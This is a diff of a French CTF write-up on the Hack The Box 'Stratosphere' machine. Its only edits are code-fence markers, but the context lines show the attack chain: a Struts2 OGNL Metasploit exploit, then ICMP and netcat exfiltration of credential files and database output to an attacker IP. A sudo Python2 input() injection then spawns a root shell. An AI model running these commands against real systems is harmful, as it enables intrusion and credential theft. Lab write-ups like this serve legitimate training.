@@ -19,7 +19,7 @@ Le serveur ne révèle pas sa bannière, toutefois si on demande un fichier qui 
 
 Un dirbuster sur le port 80 remonte les dossier suivants :  
 
-```plain
+```
 http://10.10.10.64/manager/ - HTTP 302 (0 bytes, plain) redirects to /manager/html
 http://10.10.10.64/Monitoring/ - HTTP 200 (199 bytes, plain)
 ```
@@ -46,7 +46,7 @@ On s'empresse alors d'utiliser le module *Metasploit* correspondant mais malgré
 
 Pourtant l'exécution de commande fonctionne car on si on se ping on peut voir les messages nous parvenir :  
 
-```plain
+```
 msf exploit(multi/http/struts2_content_type_ognl) > show options
 
 Module options (exploit/multi/http/struts2_content_type_ognl):
@@ -86,7 +86,7 @@ Cette fois il semble que seul le trafic sortant soit autorisé pour UDP : UDP é
 
 Une autre solution est d'exfiltrer les données via ICMP comme c'était le cas pour le CTF Persistence :  
 
-```plain
+```
 msf exploit(multi/http/struts2_content_type_ognl) > set CMD "ping -p `id | xxd -p -l 16` 10.10.14.209"
 CMD => ping -p `id | xxd -p -l 16` 10.10.14.209
 ```
@@ -108,7 +108,7 @@ Déçu par ce manque d'ouverture d'esprit, j'ai décidé de continuer à énumé
 
 La suite logique du CTF semblait consister à obtenir les identifiants du Tomcat pour passer à un autre exploit bien connu :  
 
-```plain
+```
 msf exploit(multi/http/struts2_content_type_ognl) > set CMD "cat /etc/tomcat8/tomcat-users.xml|netcat -u 10.10.14.209 9999"
 CMD => cat /etc/tomcat8/tomcat-users.xml|netcat -u 10.10.14.209 9999
 ```
@@ -123,13 +123,13 @@ Malheureusement elles se sont révélées être d'aucune utilité ici...
 
 Le mot de passe ne nous permet pas non plus d'accéder en SSH au compte utilisateur présent sur la machine :  
 
-```plain
+```
 richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
 ```
 
 Un bon gros *grep* des familles sur le terme *admin* permettra finalement de faire remonter le fichier */var/lib/tomcat8/db\_connect* (le nom du fichier ne semble pas standard d'après la quantité de résultats sur Google).  
 
-```plain
+```
 [ssn]
 user=ssn_admin
 pass=AWs64@on*&
@@ -147,7 +147,7 @@ echo 'show databases;'|mysql -uadmin -padmin 2>&1|netcat -u 10.10.14.209 8888
 
 Finalement on obtient un retour positif :  
 
-```plain
+```
 devloop@kali:~/Documents/stratosphere$ ncat -l -p 8888 -v -u
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::8888
@@ -160,7 +160,7 @@ users
 
 On enchaîne sur un *show tables* puis un *select \** :  
 
-```plain
+```
 Tables_in_users
 accounts
 
@@ -175,7 +175,7 @@ Python skills 101
 
 L'accès SSH nous permet d'obtenir le flag utilisateur (*e610b298611fa732fca1665a1c02336b*)  
 
-```plain
+```
 richard@stratosphere:~$ sudo -l
 Matching Defaults entries for richard on stratosphere:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -232,7 +232,7 @@ Ici, on voit clairement la présence d'*env\_reset* dans la ligne sudo donc pas 
 
 Il est temps de se pencher sur le contenu du code et avec mon background Python j'ai rapidement tilté sur l'utilisation de *input()* [qui est considéré non-sûr via Python2](https://stackoverflow.com/questions/31175820/simple-explanation-of-security-issues-related-to-input-vs-raw-input), ou devrais-je plutôt dire [c'est une feature expliquée noir sur blanc](https://docs.python.org/2.7/library/functions.html#input).  
 
-```plain
+```
 richard@stratosphere:~$ sudo python2 /home/richard/test.py
 Solve: 5af003e100c80923ec04d65933d382cb
 __import__("os").system("/bin/bash -p")
